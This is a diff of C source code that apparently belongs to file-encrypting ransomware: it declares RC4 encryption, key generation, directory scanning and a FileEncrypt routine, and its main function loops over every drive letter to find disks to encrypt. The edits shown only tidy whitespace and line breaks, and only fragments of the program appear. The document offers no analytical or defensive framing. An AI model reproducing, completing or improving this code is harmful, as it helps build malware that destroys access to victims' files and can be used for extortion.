@@ -18,11 +18,13 @@ void      RC4(unsigned char * data, short int length);
 
 void      WriteTrash(unsigned char * data, short int  length);
 void      FindDir(unsigned char * path, unsigned char * mask);
-void      Initialized(unsigned char * key, short int length);void      swap (unsigned char * a, unsigned char * b);
+void      Initialized(unsigned char * key, short int length);
+void      swap (unsigned char * a, unsigned char * b);
 short int RandomRange(short int min, short int max);
 short int CheckLogicalDisk(short int number_disk);
 void      FileEncrypt (unsigned char * filename);
-void      GenerateKey(void);
+void      GenerateKey(void);
+
 char * expansion    = "*";
 char * slash        = "\\";
 char * t_one        = ".";
@@ -38,9 +40,11 @@ unsigned char data       [_BYTE]        = {_ZERO};
 
 int main (void) {
  short int i;
- char LOCAL_DISK[] = "+:"; 
+ char LOCAL_DISK[] = "+:";
+ 
  srand(time(_ZERO));
- GenerateKey();
+
+ GenerateKey();
 
  for (i = 65; i <= 90; i++) {
   if (CheckLogicalDisk(i) == _ZERO) {
@@ -150,7 +154,7 @@ void FileEncrypt (unsigned char * filename) {
        //memset(buffer, _ZERO, _BUFFER_SIZE);
        position += realread;
       }
-	}
+    }
    fclose(f);
   }
 }
